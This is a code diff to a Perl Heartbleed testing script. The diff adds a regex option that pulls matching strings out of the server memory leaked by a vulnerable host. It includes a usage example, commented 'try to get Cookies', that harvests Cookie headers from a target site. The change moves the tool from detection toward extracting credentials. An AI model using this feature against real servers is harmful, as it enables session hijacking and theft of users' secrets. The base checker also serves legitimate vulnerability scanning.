@@ -13,6 +13,7 @@ my $timeout = 5;
 my $heartbeats = 1;
 my $quiet = 0;
 my $show = 0;
+my @show_regex;
 my %starttls = (
     'smtp' => \&smtp_starttls,
     'http' => \&http_connect,
@@ -32,6 +33,8 @@ Usage: $0 [ --starttls proto[:arg] ] [ --timeout T ] host:port
   -H|--heartbeats N      - number of heartbeats (default 1)
   -s|--show-data [L]     - show heartbeat response if vulnerable, optional 
                            parameter L specifies number of bytes per line (16)
+  -R|--show-regex-data R - show data matching perl regex R. Option can be
+                           used multiple times
   -q|--quiet             - don't show anything, exit 1 if vulnerable
   -h|--help              - this screen
 
@@ -40,6 +43,9 @@ Examples:
   $0 www.google.com:443
   $0 www.google.com:https
   $0 mail.google.com:imaps
+
+  # try to get Cookies 
+  $0 -R 'Cookie:.*' www.broken-site.com:443
 
   # check webserver via proxy
   $0 --starttls http:www.google.com:443 proxy:8000
@@ -63,6 +69,7 @@ GetOptions(
     'T|timeout=i' => \$timeout,
     'H|heartbeats=i' => \$heartbeats,
     's|show-data:i' => sub { $show = $_[1] || 16 },
+    'R|show-regex-match:s' => \@show_regex,
     'q|quiet' => \$quiet,
     'starttls=s' => sub {
 	(my $proto,$starttls_arg) = $_[1] =~m{^(\w+)(?::(.*))?$};
@@ -70,6 +77,15 @@ GetOptions(
 	    or not $starttls = $starttls{$proto};
     },
 );
+
+my $show_regex;
+if (@show_regex) {
+    my @rx;
+    push @rx, eval { qr{$_} } || die "invalid perl regex '$_'"
+	for(@show_regex);
+    $show_regex = join('|',@rx);
+    $show_regex = eval { qr{$show_regex} } || die "invalid regex: $show_regex";
+}
 
 my $dst = shift(@ARGV) or usage("no destination given");
 my $cl = IO::Socket::INET->new(PeerAddr => $dst, Timeout => $timeout)
@@ -113,6 +129,11 @@ if ( my ($type,$ver,$buf) = _readframe($cl)) {
     } elsif ( length($buf)>3 ) {
 	verbose("BAD! got ".length($buf)." bytes back instead of 3 (vulnerable)");
 	show_data($buf) if $show;
+	if ( $show_regex ) {
+	    while ( $buf =~m{($show_regex)}g ) {
+		print STDERR $1."\n";
+	    }
+	}
 	exit 1;
     } else {
 	verbose("GOOD proper heartbeat reply (not vulnerable)");
